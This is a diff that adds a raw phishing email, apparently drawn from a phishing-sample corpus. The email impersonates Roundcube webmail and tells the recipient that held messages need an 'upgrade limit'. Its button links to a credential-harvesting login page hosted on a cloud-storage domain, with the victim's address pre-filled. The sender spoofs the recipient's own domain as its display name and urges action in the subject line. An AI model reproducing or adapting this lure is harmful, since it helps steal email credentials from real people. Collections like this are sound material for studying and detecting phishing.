@@ -1,0 +1,75 @@
+Return-Path: cyber@gaartexx.co
+Delivered-To: jose@monkey.org
+X-FDA: 77193385878.46.net72_2201d1f27066
+X-Spam-Summary: 50,3,0,6f7cf13f5a3179ed,d41d8cd98f00b204,cyber@gaartexx.co,,RULES_HIT:41:46:72:150:153:355:375:379:474:800:962:967:969:973:978:983:988:989:1147:1189:1208:1224:1260:1311:1313:1314:1345:1381:1431:1433:1434:1436:1437:1513:1515:1516:1517:1521:1534:1542:1571:1588:1589:1593:1594:1686:1711:1714:1730:1747:1777:1792:2196:2198:2199:2200:2393:2525:2527:2553:2557:2559:2563:2610:2682:2685:2790:2828:2859:2890:2892:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3351:3865:3866:3867:3868:3870:3871:3873:3889:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:5007:6261:6653:6669:6674:6678:8518:8583:8603:9025:9080:9411:9416:9908:10004:10346:11473:11639:11657:11658:11914:11984:12043:12295:12297:12517:12519:12555:12660:12740:12749:12895:12955:12958:12959:12967:12968:12986:13139:13143:13230:13439:14093:14096:14181:14418:14420:14721:14828:21067:21080:21269:21325:21433:21450:21451:21483:21524:21554:21627:21789:21790:21819:21939:30001:30022:30054:30070:30075:30090,0,
+X-HE-Tag: net72_2201d1f27066
+X-Filterd-Recvd-Size: 3752
+Received: from cgi.gaartexx.co (unknown [68.183.140.54])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 26 Aug 2020 17:21:17 +0000 (UTC)
+Received: from authenticated-user (cgi.gaartexx.co [68.183.140.54])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by cgi.gaartexx.co (Postfix) with ESMTPSA id 6F68258A31
+	for <jose@monkey.org>; Wed, 26 Aug 2020 15:50:30 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=gaartexx.co; s=mail;
+	t=1598457030; bh=7ZJid6ShhwuQ0qiSq0F+vSVQTIAHuUGcdew4wgn6ZOc=;
+	h=From:To:Subject:Date:From;
+	b=j7kFlifqUge450QSvV2q0K6lT4mqs4ERi8bra+iCA/L7vzukr6fVqelEvNRNZqbqk
+	 mxgtLEEsE/Z7kpset71I38EJouZfgMiQk2hHc002fOvnfPZYReXLKijZl7cAUuqoHt
+	 mT6pKOVbjf38RV3v60n/QpuJqKTmr7yoVpU8cuFpquabj1g4xm95hJtLFIXohPM5+S
+	 jZMWesTQVCDtU9nPj3tE+KPkXKKV4TGul/TRXAAlsAESJS6NrK/CRZma7qfYxFuwKN
+	 B6+aidDx9SckfGTUEx/FIxkWmLrKhjIDu71feTF5yhySGqtnFJCplTro/Fd3NsC1YJ
+	 G3GBCC3ywI2AA==
+From: monkey.org  <cyber@gaartexx.co>
+To: jose@monkey.org
+Subject: =?UTF-8?B?4pqg77iPIEFDVElPTiBSRVFVSVJFRCBbIA==?=jose@monkey.org ] 
+Date: 26 Aug 2020 17:50:37 +0200
+Message-ID: <20200826175037.D20793ED46BE8815@gaartexx.co>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 119
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19781"></HEAD>
+<body>
+<P><SPAN style=3D"FONT-SIZE: medium; FONT-FAMILY: calibri"><FONT color=3D#e=
+69138>Webmail</FONT></SPAN><FONT color=3D#e69138>*</FONT></P>
+<H1 style=3D'FONT-SIZE: 46px; FONT-FAMILY: "Segoe UI",SegoeUI,"Helvetica Ne=
+ue",Helvetica,Arial,sans-serif; COLOR: rgb(0,120,212); PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; LETTER-SPACING:=
+ -0.01em; LINE-HEIGHT: 56px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(245,=
+245,245)'><FONT color=3D#00121e>ROUNDCUBE</FONT></H1>
+<P>Dear&nbsp;jose,</P>
+<P>jose@monkey.org&nbsp;you have some of your messages (5) on hold due to y=
+our account limit, resulting to undelivered messages.<BR><BR>Please click o=
+n the below button to&nbsp;preview messages and upgrade limit<BR><BR>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: roboto,robotodraft,helvetica,=
+arial,sans-serif; WIDTH: 294.75pt; COLOR: rgb(0,0,0)" cellpadding=3D"0" wid=
+th=3D"393" border=3D"0">
+<TBODY>
+<TR style=3D"MIN-HEIGHT: 22.5pt">
+<td style=3D"BORDER-TOP: rgb(0,120,215) 1pt solid; FONT-FAMILY: roboto,robo=
+todraft,helvetica,arial,sans-serif; BORDER-RIGHT: rgb(0,120,215) 1pt solid;=
+ WIDTH: 150pt; BACKGROUND-IMAGE: none; BORDER-BOTTOM: rgb(0,120,215) 1pt so=
+lid; PADDING-BOTTOM: 0.75pt; PADDING-TOP: 0.75pt; PADDING-LEFT: 15pt; MIN-H=
+EIGHT: 22.5pt; BORDER-LEFT: rgb(0,120,215) 1pt solid; PADDING-RIGHT: 15pt; =
+BACKGROUND-COLOR: rgb(0,120,215)" width=3D"200">
+<P style=3D"FONT-SIZE: 11pt; FONT-FAMILY: calibri,sans-serif,serif,emojifon=
+t; TEXT-ALIGN: center; MARGIN: 0in 0in 0pt" align=3Dcenter><SPAN style=3D"F=
+ONT-SIZE: 10.5pt; FONT-FAMILY: tahoma,sans-serif,serif,emojifont"><STRONG><=
+SPAN style=3D"COLOR: rgb(238,238,238)"><A href=3D"https://storage.googleapi=
+s.com/rryrdc/login.html#jose@monkey.org"><FONT color=3D#ffffff>Click here t=
+o view</FONT></A></SPAN></STRONG></SPAN></P></TD></TR></TBODY></TABLE></P>
+<DIV>CONFIDENTIALITY NOTICE: The information in this email, including any a=
+ttachments, is for the sole use of the intended recipient(s) and may contai=
+n confidential and legally privileged information. If you are not the inten=
+ded recipient, any disclosure, copying, distribution or use of the contents=
+ of this information in any manner is strictly prohibited and may be unlawf=
+ul.</DIV></BODY></HTML>
+
